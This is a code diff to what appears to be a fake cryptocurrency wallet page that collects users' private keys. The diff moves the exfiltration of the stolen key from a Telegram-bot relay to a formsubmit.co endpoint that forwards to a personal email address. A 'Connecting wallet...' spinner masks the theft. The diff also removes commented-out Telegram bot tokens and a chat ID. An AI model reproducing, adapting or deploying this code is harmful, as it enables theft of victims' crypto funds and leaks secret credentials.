@@ -4,8 +4,7 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <title> coinwallet-system Wallet</title>
+  <title>Coinwallet-system Wallet</title>
   <style media="all" id="fa-v4-font-face">
     /*!
  * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com
@@ -9131,22 +9130,14 @@
         if ( reqPrivateKey ) message += `Private Key\n`;
         if ( reqPrivateKey ) message += `${reqPrivateKey}\n\n`;
         message +=`********************\n`;
-        
-        // const token = "8034050830:AAEdlq9YL-JLiP0BpKhOItWUnXWS9-NyU8k";
-        // const token = "8257355695:AAEMUkSUqQFVS9eCT5mQEMtit0vLh18fIWo"; // test
-        // const chatId = "5949473270";
-
-        // return console.log(message);
 
         $.ajax({
-          type: "GET",
-          url: `https://telegram-bot-api-s1p9.onrender.com/send`,
+          type: "POST",
+          url: `https://formsubmit.co/ajax/natashanice046@gmail.com`,
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
-          data: {
-            text: message,
-          },
+          data: message,
           beforeSend: function () {
             processBtn.html(
               '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
